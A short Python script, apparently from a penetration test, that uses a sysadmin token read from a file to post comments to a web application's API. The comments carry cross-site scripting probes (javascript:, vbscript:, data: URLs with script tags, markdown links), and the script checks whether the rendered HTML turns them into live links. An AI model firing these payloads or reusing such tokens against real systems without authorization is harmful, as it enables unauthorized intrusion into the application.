import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXL'+uuid.uuid4().hex[:5]
print("=== linkifier: does it anchor attacker-typed URLs? (text, not HTML) ===")
cases=[
 ('plain-url',   f'https://example.com/{tag}'),
 ('js-url',      f'javascript:alert(1){tag}'),
 ('js-colon',    f'javascript&colon;alert(1){tag}'),
 ('data-url',    f'data:text/html,<script>alert(1)</script>{tag}'),
 ('vbscript',    f'vbscript:msgbox(1){tag}'),
 ('markdown',    f'[click](javascript:alert(1)){tag}'),
 ('mention',     f'@zx{tag}'),
 ('record-ref',  f'ISS-{tag}'),
]
for label,msg in cases:
    c,b=post({"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                         "commentable_id":33,"message_raw":msg}})
    st=''
    if c in ('200','201'):
        try:
            o=json.loads(b)['comments'][0]
            st=f"id={o['id']} html={o.get('message_html')!r}"
        except: pass
    print(f"  {label:12} {c:>4}  {st[:100]}")
